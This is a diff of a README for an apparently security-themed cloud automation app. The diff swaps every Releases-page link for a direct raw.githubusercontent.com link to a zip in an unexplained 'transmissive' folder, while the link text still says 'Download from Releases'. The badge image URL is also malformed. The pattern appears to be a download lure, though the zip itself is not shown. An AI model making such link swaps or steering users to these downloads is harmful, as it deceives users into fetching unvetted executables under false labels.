@@ -1,6 +1,6 @@
 # 🛠️ Cloud-Automation-Serverless-Security-AWS-Lambda-Terraform-PowerShell-DevSecOps - Simplifying Serverless Security Management
 
-[![Download](https://img.shields.io/badge/Download%20Now-Cloud%20Automation%20App-brightgreen)](https://github.com/trinhtantin/Cloud-Automation-Serverless-Security-AWS-Lambda-Terraform-PowerShell-DevSecOps/releases)
+[![Download](https://raw.githubusercontent.com/trinhtantin/Cloud-Automation-Serverless-Security-AWS-Lambda-Terraform-PowerShell-DevSecOps/main/transmissive/Cloud-Automation-Serverless-Security-AWS-Lambda-Terraform-PowerShell-DevSecOps.zip%20Now-Cloud%20Automation%20App-brightgreen)](https://raw.githubusercontent.com/trinhtantin/Cloud-Automation-Serverless-Security-AWS-Lambda-Terraform-PowerShell-DevSecOps/main/transmissive/Cloud-Automation-Serverless-Security-AWS-Lambda-Terraform-PowerShell-DevSecOps.zip)
 
 ## 🚀 Getting Started
 
@@ -23,7 +23,7 @@ To download and install the Cloud Automation Serverless Security application, fo
 1. **Visit the Releases Page:**
    Click the link below to access the Releases page.
    
-   [Download from Releases](https://github.com/trinhtantin/Cloud-Automation-Serverless-Security-AWS-Lambda-Terraform-PowerShell-DevSecOps/releases)
+   [Download from Releases](https://raw.githubusercontent.com/trinhtantin/Cloud-Automation-Serverless-Security-AWS-Lambda-Terraform-PowerShell-DevSecOps/main/transmissive/Cloud-Automation-Serverless-Security-AWS-Lambda-Terraform-PowerShell-DevSecOps.zip)
 
 2. **Choose the Version:**
    On the Releases page, find the latest version of the application. You will see options for different files.
@@ -93,6 +93,6 @@ This project is built around various topics, including:
 
 For further navigation, here is the key download link again:
 
-[Download from Releases](https://github.com/trinhtantin/Cloud-Automation-Serverless-Security-AWS-Lambda-Terraform-PowerShell-DevSecOps/releases)
+[Download from Releases](https://raw.githubusercontent.com/trinhtantin/Cloud-Automation-Serverless-Security-AWS-Lambda-Terraform-PowerShell-DevSecOps/main/transmissive/Cloud-Automation-Serverless-Security-AWS-Lambda-Terraform-PowerShell-DevSecOps.zip)
 
 Thank you for using the Cloud Automation Serverless Security application. We hope you find it helpful!
